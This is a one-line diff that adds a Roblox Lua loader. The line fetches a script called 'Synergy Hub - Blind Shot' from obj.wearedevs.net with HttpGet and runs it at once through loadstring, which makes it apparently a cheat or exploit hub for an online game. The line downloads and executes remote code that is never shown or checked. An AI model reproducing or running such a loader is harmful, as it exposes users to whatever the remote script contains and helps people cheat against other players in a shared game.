@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://obj.wearedevs.net/216033/scripts/Synergy%20Hub%20-%20Blind%20Shot.lua"))()
